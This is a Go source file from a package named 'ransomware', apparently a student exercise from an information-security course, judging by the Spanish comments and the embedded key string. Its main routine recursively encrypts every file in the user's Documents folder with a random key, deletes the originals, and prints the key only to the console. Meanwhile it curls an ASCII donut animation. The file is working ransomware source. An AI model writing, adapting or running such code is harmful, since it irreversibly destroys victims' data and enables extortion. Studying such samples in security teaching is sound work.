package main

import (
	"fmt"
	"math/rand"
	"os"
	"path/filepath"

	donut "ransomware/donut"
	encrypt "ransomware/encrypt"
)

func goroutineDonut(terminal *donut.Terminal) {
	err := terminal.RunCommand("curl", "ascii.live/donut")
	if err != nil {
		fmt.Printf("Error displaying donut: %v\n", err)
	}
}
func goroutineEncrypt(done chan bool, terminal *donut.Terminal, inputFile string) {
	fmt.Println("Encrypting target data...")
	key := []byte("---seguridad_informatica__UAO---")
	err := encrypt.EncryptFile(inputFile, inputFile, key)
	if err != nil {
		fmt.Printf("Error encrypting file: %v\n", err)
	} else {
		fmt.Printf("File encrypted successfully!!! ")
	}
	done <- true
}

func RandStringBytes(n int) string {

	const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}
	return string(b)
}

func main() {

	terminal := donut.NewTerminal()

	// Iniciar el arte ASCII de un donut en otra goroutine
	go func() {
		err := terminal.RunCommand("curl", "ascii.live/donut")
		if err != nil {
			fmt.Println("Error ejecutando el comando:", err)
			os.Exit(1)
		}
	}()

	// Get user directory
	dirname, erro := os.UserHomeDir()
	if erro != nil {
		fmt.Println(erro)
	}

	documentsFolder := (dirname + "\\Documents")
	key := RandStringBytes(32)

	fmt.Printf(key)

	directory := documentsFolder
	//directory := "./test" // Define el directorio que deseas encriptar
	//key := []byte("---seguridad_informatica__UAO---")

	err := filepath.Walk(directory, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			outputPath := path + ".enc"
			fmt.Printf("Encriptando %s\n", path)
			if err := encrypt.EncryptFile(path, outputPath, []byte(key)); err != nil {
				fmt.Println("Error al encriptar el archivo:", err)
				return err
			}
			if err := os.Remove(path); err != nil {
				fmt.Printf("Error al eliminar el archivo original %s: %v\n", path, err)
				return err
			}
			fmt.Printf("Archivo %s encriptado y eliminado correctamente\n", path)
		}
		return nil
	})

	if err != nil {
		fmt.Println("Error al encriptar o eliminar los archivos:", err)
		os.Exit(1)
	}

	fmt.Println("Todos los archivos han sido encriptados y los originales eliminados.")
	os.Exit(0)
}
